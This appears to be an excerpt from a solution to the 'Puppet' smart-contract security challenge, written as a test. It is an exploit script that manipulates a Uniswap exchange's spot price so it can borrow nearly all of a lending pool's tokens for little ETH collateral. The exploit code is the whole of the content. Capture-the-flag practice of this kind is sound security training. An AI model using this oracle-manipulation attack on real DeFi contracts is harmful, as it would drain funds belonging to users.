...
describe('[Challenge] Puppet', function () {
	...
	it('Exploit', async function () {
		...
		let deadline = (await web3.eth.getBlock('latest')).timestamp * 2;

		let price = await this.uniswapExchange.getTokenToEthInputPrice(
			ether('100')
		);

		await this.token.approve(this.uniswapExchange.address, ether('100'), {
			from: attacker,
		});

		await this.uniswapExchange.tokenToEthTransferInput(
			ether('100'),
			new BN(price),
			deadline,
			attacker,
		...
		await this.lendingPool.borrow(ether('600'), {
			from: attacker,
			value: ether('5'),
		});

		price = await this.uniswapExchange.getTokenToEthInputPrice(ether('600'));

		await this.token.approve(this.uniswapExchange.address, ether('600'), {
			from: attacker,
		});
		...
		await this.lendingPool.borrow(ether('9400'), {
			from: attacker,
			value: ether('4'),
		});

		price = await this.uniswapExchange.getEthToTokenInputPrice(ether('0.81'));

		await this.uniswapExchange.ethToTokenTransferInput(
			ether('0.81'),
			deadline,
			attacker,
			{ from: attacker, value: ether('0.81') }
		);

		// console.log(
		//   parseInt(await balance.current(this.uniswapExchange.address)) / 10 ** 18
		// );

		// console.log(
		//   parseInt(await this.token.balanceOf(this.uniswapExchange.address)) /
		//     10 ** 18
		// );

		// console.log(
		//   parseInt(await this.token.balanceOf(this.lendingPool.address)) / 10 ** 18
		// );

		// console.log(parseInt(await this.token.balanceOf(attacker)) / 10 ** 18);
	});
